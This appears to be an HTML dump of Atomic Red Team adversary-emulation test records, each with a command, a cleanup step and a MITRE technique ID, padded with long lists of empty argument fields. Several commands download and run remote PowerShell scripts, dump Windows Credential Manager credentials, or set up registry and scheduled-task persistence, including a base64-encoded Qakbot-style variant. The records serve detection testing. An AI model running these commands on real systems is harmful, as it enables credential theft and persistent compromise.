<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8fd5a296-6772-4766-9991-ff4e92af7240</li>
<li><strong>name</strong>: Dump credentials from Windows Credential Manager With PowerShell [web Credentials]</li>
<li><strong>description</strong>: This module will extract the credentials from Windows Credential Manager</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1555</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: eb44f842-0457-4ddc-9b92-c4caa144ac42</li>
<li><strong>name</strong>: PowerShell Registry RunOnce</li>
<li>
<p><strong>description</strong>: RunOnce Key Persistence via PowerShell
Upon successful execution, a new entry will be added to the runonce item in the registry.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(<code>"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat</code>")"'</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9dc7767b-30c1-4cc4-b999-50cab5e27891</li>
<li><strong>name</strong>: SystemBC Malware-as-a-Service Registry</li>
<li>
<p><strong>description</strong>: This Atomic will create a registry key called socks5_powershell for persistance access
https://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $RunKey = "#{reg_key_path}"
Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-ItemProperty -Path #{reg_key_path} -Name "socks5_powershell" -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1547.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 4e524c4e-0e02-49aa-8df5-93f3f7959b9f</li>
<li><strong>name</strong>: Get-DomainGPO to display group policy information via PowerView</li>
<li><strong>description</strong>: Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1615</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 52778a8f-a10b-41a4-9eae-52ddb74072bf</li>
<li><strong>name</strong>: MSFT Get-GPO Cmdlet</li>
<li><strong>description</strong>: The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} &gt;&gt; #{gpo_output}</li>
<li><strong>prereq_command</strong>: if(Get-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 | Where-Object { $_.State -eq 'Installed' }){ exit 0 } else { exit 1 }</li>
<li><strong>get_prereq_command</strong>: Add-WindowsCapability -online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0</li>
<li><strong>cleanup_command</strong>: del $env:temp\GPO_Output.txt -erroraction silentlycontinue</li>
<li><strong>mitre_id</strong>: T1615</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd</li>
<li><strong>name</strong>: Powershell Cmdlet Scheduled Task</li>
<li><strong>description</strong>: Create an atomic scheduled task that leverages native powershell cmdlets.</li>
</ul>
<p>Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false &gt;$null 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1053.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: e895677d-4f06-49ab-91b6-ae3742d0a2ba</li>
<li><strong>name</strong>: Scheduled Task Executing Base64 Encoded Commands From Registry</li>
<li><strong>description</strong>: A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.
The scheduled task will launch powershell to decode and run the command in the registry daily.
This is a persistence mechanism recently seen in use by Qakbot.  </li>
</ul>
<p><a href="https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/">Additiona Information</a></p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\ATOMIC-T1053.005).test)))" /sc daily /st #{time}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: schtasks /delete /tn "ATOMIC-T1053.005" /F &gt;nul 2&gt;&amp;1
reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1053.005</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
